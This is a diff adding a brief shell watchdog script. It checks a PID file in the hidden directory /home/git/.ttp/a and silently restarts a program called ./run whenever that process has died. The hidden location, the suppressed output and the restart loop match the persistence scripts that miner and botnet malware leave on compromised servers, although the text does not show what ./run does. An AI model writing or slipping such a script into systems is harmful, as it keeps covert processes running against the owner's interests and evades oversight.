@@ -1,0 +1,10 @@
+#!/bin/sh
+cd /home/git/.ttp/a
+if test -r /home/git/.ttp/a/bash.pid; then
+pid=$(cat /home/git/.ttp/a/bash.pid)
+if $(kill -CHLD $pid >/dev/null 2>&1)
+then
+exit 0
+fi
+fi
+./run &>/dev/null
